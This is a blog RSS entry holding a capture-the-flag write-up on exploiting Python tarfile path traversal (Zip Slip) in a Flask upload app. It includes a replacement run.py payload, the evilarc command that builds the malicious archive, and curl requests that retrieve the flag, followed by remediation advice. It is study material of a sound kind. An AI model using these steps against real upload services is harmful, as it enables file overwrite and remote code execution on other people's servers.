<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="../assets/xml/rss.xsl" media="all"?><rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>haicen.me (Posts about zipslip)</title><link>https://blog.haicen.me/</link><description></description><atom:link href="https://blog.haicen.me/categories/zipslip.xml" rel="self" type="application/rss+xml"></atom:link><language>en</language><copyright>Contents © 2023 &lt;a href="mailto:haicenhack@protonmail.com"&gt;Haicen&lt;/a&gt; </copyright><lastBuildDate>Sat, 18 Nov 2023 13:36:39 GMT</lastBuildDate><generator>Nikola (getnikola.com)</generator><docs>http://blogs.law.harvard.edu/tech/rss</docs><item><title>Zip Slip (malicious archives)</title><link>https://blog.haicen.me/posts/zip-slip-malicious-archives/</link><dc:creator>Haicen</dc:creator><description>&lt;p&gt;Recently, I completed a CTF challenge that involved an interesting vulnerability.
Since the challenge is active, I won't be providing screenshots, but I've kept things general enough that it shouldn't spoil anything.&lt;/p&gt;
&lt;section id="the-web-app"&gt;
&lt;h2&gt;The web app&lt;/h2&gt;
&lt;p&gt;The entire app was provided with a dockerfile, so it could be run offline.&lt;/p&gt;
&lt;p&gt;My first step was to investigate the app and see what vulnerabilities might exist.
The web app is very simple, and was developed using Flask.
It contains a single web page that allows you to upload a tar.gz file.
The uploaded file is extracted using the &lt;a class="reference external" href="https://docs.python.org/3/library/tarfile.html"&gt;tarfile&lt;/a&gt; library.
The validation of user uploaded file is insufficient.&lt;/p&gt;
&lt;p&gt;First, the file is checked to see if it is indeed a tarfile, with a call to &lt;code class="docutils literal"&gt;tarfile.is_tarfile()&lt;/code&gt;.
If this is true, then &lt;cite&gt;tarfile.extract_all()&lt;/cite&gt; is called. There is a warning about this function in the docs.&lt;/p&gt;
&lt;p&gt;Warning&lt;/p&gt;
&lt;p&gt;&lt;code class="docutils literal"&gt;Never extract archives from untrusted sources without prior inspection. It is possible that files are created outside of path, e.g. members that have absolute filenames starting with "/" or filenames with two dots &lt;span class="pre"&gt;"..".&lt;/span&gt;&lt;/code&gt;&lt;/p&gt;
&lt;/section&gt;
&lt;section id="the-vulnerability"&gt;
&lt;h2&gt;The vulnerability&lt;/h2&gt;
&lt;p&gt;Some further research reveals that this is quite an old vulnerability.
The tar program was discovered to be vulnerable all the way back in 2001, &lt;a class="reference external" href="https://nvd.nist.gov/vuln/detail/CVE-2001-1267"&gt;CVE-2001-1267&lt;/a&gt;
The core issue is that tar did not validate filenames, so if the archive contained a file named &lt;code class="docutils literal"&gt;&lt;span class="pre"&gt;../../../../etc/passwd&lt;/span&gt;&lt;/code&gt;, when extracted it would overwrite &lt;code class="docutils literal"&gt;/etc/passwd&lt;/code&gt; by traversing the &lt;code class="docutils literal"&gt;../&lt;/code&gt; directives as long the user invoking tar had the appropriate permissions)&lt;/p&gt;
&lt;p&gt;The python tarfile module apparently shares a great deal of similar code, because the same issue was identified in the python module in 2007 (6 years after the original tar vulnerability).
This was discussed on the python-dev email list &lt;a class="reference external" href="https://mail.python.org/pipermail/python-dev/2007-August/074290.html"&gt;https://mail.python.org/pipermail/python-dev/2007-August/074290.html&lt;/a&gt;
It was again discussed in 2014, &lt;a class="reference external" href="https://bugs.python.org/issue21109"&gt;https://bugs.python.org/issue21109&lt;/a&gt;
Now, 20 years later, there still isn't a resolution.&lt;/p&gt;
&lt;p&gt;In the general sense, I see two potential ways of exploiting a vulnerability like this.
In modern linux environments, /etc/passwd no longer contains sensitive information like password hashes, so overwriting that file won't allow access to the machine.
One potential attack would be to overwrite the users &lt;code class="docutils literal"&gt;&lt;span class="pre"&gt;~/.ssh/authorized_keys&lt;/span&gt;&lt;/code&gt; file to include your own key.
Of course, for that to be exploitable, you would already need access to the file system.&lt;/p&gt;
&lt;p&gt;Since python is now popular for developing web apps through Django and Flask, this opens up a new avenue: uploading a malicious archive to overwrite or create files.&lt;/p&gt;
&lt;p&gt;Back to the challenge, since the app is flask, it is possible to overwrite the main app handler.&lt;/p&gt;
&lt;p&gt;The original file is quite simple&lt;/p&gt;
&lt;div class="code"&gt;&lt;table class="codetable"&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_5d05550b16f44aa6ad1684f92562ff5c-1"&gt;&lt;code data-line-number="1"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_5d05550b16f44aa6ad1684f92562ff5c-1" name="rest_code_5d05550b16f44aa6ad1684f92562ff5c-1"&gt;&lt;/a&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;application.main&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;app&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_5d05550b16f44aa6ad1684f92562ff5c-2"&gt;&lt;code data-line-number="2"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_5d05550b16f44aa6ad1684f92562ff5c-2" name="rest_code_5d05550b16f44aa6ad1684f92562ff5c-2"&gt;&lt;/a&gt;&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'0.0.0.0'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1337&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;debug&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;use_evalex&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;p&gt;and the modified code:&lt;/p&gt;
&lt;div class="code"&gt;&lt;table class="codetable"&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-1"&gt;&lt;code data-line-number=" 1"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-1" name="rest_code_830da48576d146a596598d2c7ea8ff80-1"&gt;&lt;/a&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;application.main&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;app&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-2"&gt;&lt;code data-line-number=" 2"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-2" name="rest_code_830da48576d146a596598d2c7ea8ff80-2"&gt;&lt;/a&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;shutil&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-3"&gt;&lt;code data-line-number=" 3"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-3" name="rest_code_830da48576d146a596598d2c7ea8ff80-3"&gt;&lt;/a&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-4"&gt;&lt;code data-line-number=" 4"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-4" name="rest_code_830da48576d146a596598d2c7ea8ff80-4"&gt;&lt;/a&gt;&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-5"&gt;&lt;code data-line-number=" 5"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-5" name="rest_code_830da48576d146a596598d2c7ea8ff80-5"&gt;&lt;/a&gt;    &lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'/app/application/static/'&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-6"&gt;&lt;code data-line-number=" 6"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-6" name="rest_code_830da48576d146a596598d2c7ea8ff80-6"&gt;&lt;/a&gt;    &lt;span class="n"&gt;shutil&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;copy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'flag'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'flag'&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-7"&gt;&lt;code data-line-number=" 7"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-7" name="rest_code_830da48576d146a596598d2c7ea8ff80-7"&gt;&lt;/a&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-8"&gt;&lt;code data-line-number=" 8"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-8" name="rest_code_830da48576d146a596598d2c7ea8ff80-8"&gt;&lt;/a&gt;    &lt;span class="n"&gt;out&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;check_output&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'id'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-9"&gt;&lt;code data-line-number=" 9"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-9" name="rest_code_830da48576d146a596598d2c7ea8ff80-9"&gt;&lt;/a&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-10"&gt;&lt;code data-line-number="10"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-10" name="rest_code_830da48576d146a596598d2c7ea8ff80-10"&gt;&lt;/a&gt;    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'logfile.txt'&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="s1"&gt;'w'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-11"&gt;&lt;code data-line-number="11"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-11" name="rest_code_830da48576d146a596598d2c7ea8ff80-11"&gt;&lt;/a&gt;        &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-12"&gt;&lt;code data-line-number="12"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-12" name="rest_code_830da48576d146a596598d2c7ea8ff80-12"&gt;&lt;/a&gt;&lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-13"&gt;&lt;code data-line-number="13"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-13" name="rest_code_830da48576d146a596598d2c7ea8ff80-13"&gt;&lt;/a&gt;    &lt;span class="k"&gt;pass&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-14"&gt;&lt;code data-line-number="14"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-14" name="rest_code_830da48576d146a596598d2c7ea8ff80-14"&gt;&lt;/a&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-15"&gt;&lt;code data-line-number="15"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-15" name="rest_code_830da48576d146a596598d2c7ea8ff80-15"&gt;&lt;/a&gt;&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'0.0.0.0'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1337&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;debug&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;use_evalex&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;p&gt;This simply copies the flag from it's location within the app folder to the static files that are served by flask.
This could be modified to do the same thing for multiple files, or initiate a reverse shell.&lt;/p&gt;
&lt;/section&gt;
&lt;section id="the-exploit"&gt;
&lt;h2&gt;The exploit&lt;/h2&gt;
&lt;p&gt;I found a tool that had already been created to craft the malicious archive.&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://github.com/ptoomey3/evilarc"&gt;https://github.com/ptoomey3/evilarc&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;That script uses the same vulnerable library to craft the archive.
This also appears to work on zip archives as well, but that's something for another time.&lt;/p&gt;
&lt;p&gt;Simply running the script &lt;code class="docutils literal"&gt;python evilarc.py run.py &lt;span class="pre"&gt;-f&lt;/span&gt; evil.tar.gz &lt;span class="pre"&gt;-o&lt;/span&gt; unix &lt;span class="pre"&gt;-p&lt;/span&gt; /app&lt;/code&gt; generates the archive.&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;p&gt;&lt;code class="docutils literal"&gt;evil.tar.gz&lt;/code&gt; is the file that is created&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code class="docutils literal"&gt;run.py&lt;/code&gt; is the modified file from earlier&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code class="docutils literal"&gt;&lt;span class="pre"&gt;-p&lt;/span&gt; /app&lt;/code&gt; specifies the directory where &lt;code class="docutils literal"&gt;run.py&lt;/code&gt; will be overwritten after traversal&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Uploading the resulting file in a browser and then doing &lt;code class="docutils literal"&gt;curl &lt;span class="pre"&gt;http://localhost:1337/static/flag&lt;/span&gt;&lt;/code&gt; outputs the flag.&lt;/p&gt;
&lt;p&gt;Further, &lt;code class="docutils literal"&gt;curl &lt;span class="pre"&gt;http://localhost:1337/static/logfile.txt&lt;/span&gt;&lt;/code&gt; reveals this app is running as root
&lt;code class="docutils literal"&gt;'uid=0(root) gid=0(root) &lt;span class="pre"&gt;groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)&lt;/span&gt;&lt;/code&gt;&lt;/p&gt;
&lt;/section&gt;
&lt;section id="impact"&gt;
&lt;h2&gt;Impact&lt;/h2&gt;
&lt;p&gt;This is a pretty severe vulnerability as it allows full remote code execution.
In this particular instance, the flask app is run as root, and directly runs the app.py file in debug mode.&lt;/p&gt;
&lt;/section&gt;
&lt;section id="remediation"&gt;
&lt;h2&gt;Remediation&lt;/h2&gt;
&lt;p&gt;The most severe problem with this app is that the contents of the uploaded file are trusted implicitly.
To fix this, the user-supplied archive should not be blindly extracted.
There currently isn't a fixed version of the &lt;code class="docutils literal"&gt;tarfile&lt;/code&gt; module, so until that is fixed upstream, some crude checks might provide some protection.
Ex: refusing to extract files that start with &lt;code class="docutils literal"&gt;..&lt;/code&gt;
The flask app shouldn't be run with debug mode turned on in a production environment.
The flask app also shouldn't be running as root.&lt;/p&gt;
&lt;p&gt;I'm not sure how applicable this is to real world websites, as this example relies on &lt;code class="docutils literal"&gt;supervisord&lt;/code&gt; detecting the overwritten &lt;code class="docutils literal"&gt;/app/run.py&lt;/code&gt; file and reloading.
Having never deployed a flask app to production myself, my understanding is that something like gnuicorn would only do that if debug settings were explicitly enabled.
&lt;a class="reference external" href="https://docs.gunicorn.org/en/stable/settings.html#debugging"&gt;https://docs.gunicorn.org/en/stable/settings.html#debugging&lt;/a&gt;&lt;/p&gt;
&lt;/section&gt;
&lt;section id="closing"&gt;
&lt;h2&gt;Closing&lt;/h2&gt;
&lt;p&gt;This was a really fun challenge (and writing this took much longer than getting the flag).
It is really interesting that this bug still exists 20 years after first identified in tar.
The spread of python based web apps due to the popularity of Django and flask has brought old vulnerabilities that previously required local file system access can now be leveraged to remotely execute code.&lt;/p&gt;
&lt;/section&gt;</description><category>ctf</category><category>evilarc</category><category>flask</category><category>hacking</category><category>python</category><category>zipslip</category><guid>https://blog.haicen.me/posts/zip-slip-malicious-archives/</guid><pubDate>Sat, 04 Dec 2021 22:41:43 GMT</pubDate></item></channel></rss>